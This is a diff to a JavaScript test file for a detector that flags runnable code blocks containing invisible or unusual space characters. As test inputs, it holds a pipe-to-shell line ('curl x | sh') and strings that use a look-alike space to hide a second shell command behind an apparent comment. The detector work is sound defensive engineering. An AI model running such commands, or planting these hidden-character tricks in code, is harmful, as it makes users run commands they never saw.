@@ -84,8 +84,19 @@ test('a block holding a line separator, soft hyphen, invisible operator, variati
   assert.equal(runnableBlock('console', '$ cat notes\u2028; curl x | sh').hidden, true, 'a line separator the page draws as a second line');
 });
 
-test('tab, newline and the text people write in other scripts are not hidden', () => {
-  for (const text of ['a\tb', 'a\nb', 'h\u00e9llo', '\u65e5\u672c\u8a9e', '\u0e2a\u0e27\u0e31\u0e2a\u0e14\u0e35', '\u{1f600}', 'a\u00a0b', 'a\u3000b']) {
+test('a space that is not the plain one is hidden, because a shell reads some as part of a word and the page draws them all as a gap', () => {
+  const spaces = ['\u00a0', '\u1680', ...Array.from({ length: 11 }, (_, n) => String.fromCharCode(0x2000 + n)), '\u202f', '\u205f', '\u3000', '\u2800'];
+  for (const c of spaces) {
+    const code = c.codePointAt(0).toString(16);
+    assert.equal(runnableBlock('bash', `echo safe${c}#; echo RAN`).hidden, true, code);
+    assert.equal(hasHiddenCharacters(`a${c}b`), true, code);
+  }
+  assert.equal(runnableBlock('console', '$ npm test\u00a0#; curl x | sh').hidden, true);
+  assert.equal(runnableBlock('bash', 'echo safe #; echo ok').hidden, false, 'a plain space is seen');
+});
+
+test('tab, newline, a plain space and the text people write in other scripts are not hidden', () => {
+  for (const text of ['a\tb', 'a\nb', 'a b', 'h\u00e9llo', '\u65e5\u672c\u8a9e', '\u0e2a\u0e27\u0e31\u0e2a\u0e14\u0e35', '\u{1f600}']) {
     assert.equal(hasHiddenCharacters(text), false, JSON.stringify(text));
   }
 });
